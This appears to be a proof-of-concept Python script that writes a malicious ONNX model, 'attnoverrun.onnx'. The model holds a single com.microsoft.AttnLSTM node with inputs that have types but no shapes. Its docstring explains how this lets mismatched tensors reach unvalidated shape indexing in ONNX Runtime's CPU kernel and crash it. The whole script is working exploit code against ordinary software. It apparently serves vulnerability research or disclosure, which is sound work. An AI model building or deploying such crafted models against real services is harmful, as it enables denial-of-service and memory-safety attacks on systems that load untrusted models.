#!/usr/bin/env python3
"""Build the malicious AttnOverrun ONNX model.

A single com.microsoft.AttnLSTM (opset 1) node whose graph inputs declare element
types but NO shapes. Without declared shapes, ONNX Runtime cannot reject
rank-mismatched runtime tensors, and the CPU kernel's unvalidated TensorShape
indexing (deep_cpu_attn_lstm.cc:99-101, reads X_shape[2] BEFORE ValidateInputs) is
reached. The op's many inputs (14) are all declared shapeless; the crash happens at
X_shape[2] before any attention input is dereferenced.
"""
import os

import onnx
from onnx import TensorProto, helper

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "attnoverrun.onnx")

INPUTS = [
    "X", "W", "R", "B", "sequence_lens", "initial_h", "initial_c", "P",
    "am_query_layer_weights", "am_memory_layer_weights", "am_v_weights",
    "attn_memory", "attn_memory_seq_lens", "attn_layer_weights",
]
INT_INPUTS = {"sequence_lens", "attn_memory_seq_lens"}


def build(path):
    node = helper.make_node(
        "AttnLSTM", INPUTS, ["Y", "Y_h", "Y_c"],
        domain="com.microsoft",
        hidden_size=2,
    )
    graph = helper.make_graph(
        [node],
        "attnoverrun",
        # shape=None -> ValueInfo carries type only, no shape (the reachability key)
        [helper.make_tensor_value_info(
            n, TensorProto.INT32 if n in INT_INPUTS else TensorProto.FLOAT, None)
         for n in INPUTS],
        [helper.make_tensor_value_info("Y", TensorProto.FLOAT, None),
         helper.make_tensor_value_info("Y_h", TensorProto.FLOAT, None),
         helper.make_tensor_value_info("Y_c", TensorProto.FLOAT, None)],
    )
    model = helper.make_model(
        graph,
        opset_imports=[helper.make_opsetid("com.microsoft", 1)],
        ir_version=8,
    )
    onnx.save(model, path)
    print(f"[+] wrote {path}")


if __name__ == "__main__":
    build(OUT)
